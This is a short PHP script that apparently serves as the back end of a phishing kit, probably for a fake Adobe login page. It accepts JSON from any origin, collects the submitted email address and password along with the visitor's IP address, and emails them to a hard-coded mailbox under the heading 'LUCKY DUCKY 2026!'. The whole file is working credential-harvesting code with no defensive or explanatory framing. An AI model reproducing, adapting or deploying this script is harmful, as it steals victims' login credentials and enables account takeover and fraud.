<?php 
header('Access-Control-Allow-Origin: *');

header('Access-Control-Allow-Methods: GET, POST');

header("Access-Control-Allow-Headers: Content-Type");

$contentType = isset($_SERVER["CONTENT_TYPE"]) ? trim($_SERVER["CONTENT_TYPE"]) : '';

if ($contentType === "application/json") {
    //Receive the RAW post data.
    $content = trim(file_get_contents("php://input")); 
    $decoded = json_decode($content);
    $decoded->ipaddress = $_SERVER['REMOTE_ADDR']." - ".$_SERVER['HTTP_X_FORWARDED_FOR'];
    $to = 'paypal@africaprintexpo.com';
    $subject = '2026 reEng adobe!';
    $from = 'paypal@africaprintexpo.com';
 
    // To send HTML mail, the Content-type header must be set
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 
    // Create email headers
    $headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();
 
    // Compose a simple HTML email message
    $message = '<html><body>';
    $message .= '<h1 style="color:#f40;">LUCKY DUCKY 2026!</h1>';
    $message .= '<p style="color:#080;font-size:18px;">Email- '.$decoded->u.'</p>';
    $message .= '<p style="color:#080;font-size:18px;">Password- '.$decoded->pp.'</p>';
    $message .= '<p style="color:#080;font-size:18px;">IP Address- '.$decoded->ipaddress.'</p>';
    $message .= '</body></html>';
 
    // Sending email
        if(mail($to, $subject, $message, $headers)){
            echo 'Your mail has been sent successfully.';
        } else{
            echo 'Unable to send email. Please try again.';
        }
    }
?>